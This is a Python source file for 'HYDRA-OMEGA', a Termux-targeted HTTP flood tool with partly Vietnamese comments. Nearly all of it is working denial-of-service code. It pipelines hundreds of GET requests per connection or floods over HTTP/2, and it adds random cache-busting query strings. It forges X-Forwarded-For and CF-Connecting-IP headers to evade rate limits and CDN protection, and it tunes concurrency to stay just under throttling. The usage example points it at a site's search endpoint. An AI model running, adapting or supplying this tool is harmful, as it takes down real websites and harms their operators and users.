# ==============================================================================
# HYDRA-OMEGA // FINAL TERMUX ENGINE (PRODUCTION GRADE)
# Language: Python 3.11+ | Target: Android Termux (ARM64)
# Features: AsyncIO, uvloop, Raw Socket Pipelining, HTTP/2 fallback, Adaptive Engine
# ==============================================================================

import asyncio
import random
import time
import sys
import ssl
import socket
import string
import signal
from urllib.parse import urlparse, quote
from collections import deque
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple

# --- CORE OPTIMIZATION ---
try:
    import uvloop
    uvloop.install()
except ImportError:
    print("[!] Warning: uvloop not found. Speed will be throttled.")
    pass

try:
    import httpx
except ImportError:
    print("[!] Warning: httpx not found. HTTP/2 disabled.")
    httpx = None

# --- CONFIGURATION & FINGERPRINTS ---
@dataclass
class Config:
    target_url: str
    duration: int
    concurrency: int
    pipe_depth: int = 100
    max_clients: int = 400
    timeout: float = 8.0

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
]
ACCEPT_POOL = ["*/*", "text/html,application/xhtml+xml", "application/json", "text/plain, */*; q=0.01"]
LANG_POOL = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "fr-FR,fr;q=0.8", "zh-CN,zh;q=0.9"]

# --- STATISTICS & ADAPTIVE STATE ---
@dataclass
class Stats:
    total_req: int = 0
    success: int = 0
    error: int = 0
    rate_limited: int = 0
    rps: int = 0
    start_time: float = field(default_factory=time.monotonic)
    
    def reset_window(self):
        self.success = 0
        self.error = 0
        self.rate_limited = 0

class AdaptiveEngine:
    def __init__(self, min_c: int, max_c: int):
        self.min_c = min_c
        self.max_c = max_c
        self.current = min_c
        self.stats = Stats()
        self.lock = asyncio.Lock()

    async def record(self, status: int):
        async with self.lock:
            self.stats.total_req += 1
            if status in (429, 503, 403):
                self.stats.rate_limited += 1
            elif 200 <= status < 400:
                self.stats.success += 1
            else:
                self.stats.error += 1

    async def adapt_loop(self, stop_event: asyncio.Event):
        last_total = 0
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            async with self.lock:
                self.stats.rps = self.stats.total_req - last_total
                last_total = self.stats.total_req
                
                # Dynamic Concurrency Scaling
                if self.stats.rate_limited > 20 or self.stats.error > 50:
                    self.current = max(self.min_c, int(self.current * 0.7))
                elif self.stats.rate_limited == 0 and self.stats.success > 30:
                    self.current = min(self.max_c, int(self.current * 1.1))

                print(f"[~] RPS: {self.stats.rps}/s | Total: {self.stats.total_req} | Conc: {self.current} | "
                      f"OK: {self.stats.success} | ERR: {self.stats.error} | RATE: {self.stats.rate_limited}")
                
                self.stats.reset_window()

# --- UTILITIES ---
def generate_random_string(length: int = 8) -> str:
    return quote("".join(random.choices(string.ascii_letters + string.digits, k=length)))

def generate_fake_ip() -> str:
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def build_raw_http_payload(host: str, path: str, pipe_depth: int) -> bytes:
    payload = bytearray()
    for _ in range(pipe_depth):
        rand_str = generate_random_string()
        target_path = f"{path}{rand_str}" if "?" in path else f"{path}?q={rand_str}"
        fake_ip = generate_fake_ip()
        
        req = (
            f"GET {target_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {random.choice(UA_POOL)}\r\n"
            f"Accept: {random.choice(ACCEPT_POOL)}\r\n"
            f"Accept-Language: {random.choice(LANG_POOL)}\r\n"
            f"X-Forwarded-For: {fake_ip}\r\n"
            f"CF-Connecting-IP: {fake_ip}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode('utf-8')
        payload.extend(req)
    return bytes(payload)

# --- WORKERS ---
async def raw_socket_worker(host: str, port: int, use_ssl: bool, path: str, config: Config, engine: AdaptiveEngine, stop_event: asyncio.Event, ssl_ctx: ssl.SSLContext):
    """Deep Pipelining Worker: Gửi 100 requests trong 1 gói TCP"""
    while not stop_event.is_set():
        try:
            reader, writer = await asyncio.open_connection(
                host, port, ssl=ssl_ctx if use_ssl else None
            )
            
            payload = build_raw_http_payload(host, path, config.pipe_depth)
            writer.write(payload)
            await writer.drain()
            await engine.record(200) # Giả định thành công nếu gửi được
            
            # Đọc 1 phần response để keep-alive hoạt động, sau đó đóng
            try:
                await asyncio.wait_for(reader.read(1024), timeout=config.timeout)
            except asyncio.TimeoutError:
                pass
                
            writer.close()
            await writer.wait_closed()
            
        except (ConnectionError, OSError, ssl.SSLError):
            await engine.record(0)
            await asyncio.sleep(0.01)

async def http2_worker(client: httpx.AsyncClient, base_url: str, path: str, config: Config, engine: AdaptiveEngine, stop_event: asyncio.Event):
    """HTTP/2 Multiplexing Worker: Dùng cho server hỗ trợ giao thức mới"""
    while not stop_event.is_set():
        try:
            rand_str = generate_random_string(12)
            if "?" in path:
                full_path = f"{path}{rand_str}"
            elif "search" in path or "login" in path or "api" in path:
                full_path = f"{path}?q={rand_str}&_={int(time.time()*1000)}"
            else:
                sep = "&" if "?" in path else "?"
                full_path = f"{path}{sep}_={int(time.time()*1000)}{rand_str}"

            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": random.choice(ACCEPT_POOL),
                "Accept-Language": random.choice(LANG_POOL),
                "X-Forwarded-For": generate_fake_ip(),
                "CF-Connecting-IP": generate_fake_ip(),
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }

            resp = await client.get(base_url + full_path, headers=headers)
            await engine.record(resp.status_code)
        except Exception:
            await engine.record(0)
            
        await asyncio.sleep(random.uniform(0.01, 0.05))

# --- MAIN EXECUTION ---
async def run_hydra_omega(target: str, duration: int, concurrency: int, mode: str):
    u = urlparse(target)
    if u.scheme not in ("http", "https"):
        print("[-] Invalid scheme")
        return

    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    use_ssl = (u.scheme == "https")
    path = u.path or "/"
    if u.query:
        path += f"?{u.query}"

    base_url = f"{u.scheme}://{u.hostname}"
    if u.port:
        base_url += f":{u.port}"

    config = Config(target_url=target, duration=duration, concurrency=concurrency)
    engine = AdaptiveEngine(min_c=30, max_c=concurrency)
    stop_event = asyncio.Event()
    
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    print(f"==================================================")
    print(f"[+] HYDRA-OMEGA KÍCH HOẠT")
    print(f"[+] Target: {target}")
    print(f"[+] Duration: {duration}s | Mode: {mode.upper()} | Max Conc: {concurrency}")
    print(f"==================================================")

    tasks = []
    
    if mode == "raw":
        print("[*] Đang sử dụng Raw Socket Pipelining...")
        tasks = [asyncio.create_task(raw_socket_worker(host, port, use_ssl, path, config, engine, stop_event, ssl_ctx)) for _ in range(concurrency)]
    elif mode == "http2" and httpx:
        print("[*] Đang sử dụng HTTP/2 Multiplexing...")
        limits = httpx.Limits(max_keepalive_connections=100, max_connections=200)
        client = httpx.AsyncClient(http2=True, limits=limits, timeout=config.timeout, verify=False)
        tasks = [asyncio.create_task(http2_worker(client, base_url, path, config, engine, stop_event)) for _ in range(concurrency)]
    
    # Engine Logger Task
    tasks.append(asyncio.create_task(engine.adapt_loop(stop_event)))

    try:
        await asyncio.sleep(duration)
    except KeyboardInterrupt:
        print("\n[!] Dừng khẩn cấp...")
    finally:
        stop_event.set()
        for t in tasks:
            t.cancel()
        if mode == "http2" and httpx:
            await client.aclose()
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"\n[+] Hoàn tất. Tổng request: {engine.stats.total_req}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 hydra_omega.py <url> <duration> <concurrency> [mode]")
        print("Modes: raw (default), http2")
        print("Ví dụ Wifi Max Cực: python3 hydra_omega.py 'https://target.com/search?q=' 120 600 raw")
        sys.exit(1)
        
    target_url = sys.argv[1]
    duration_sec = int(sys.argv[2])
    concurrency = int(sys.argv[3])
    mode = sys.argv[4] if len(sys.argv) > 4 else "raw"
    
    try:
        asyncio.run(run_hydra_omega(target_url, duration_sec, concurrency, mode))
    except KeyboardInterrupt:
        sys.exit(130)
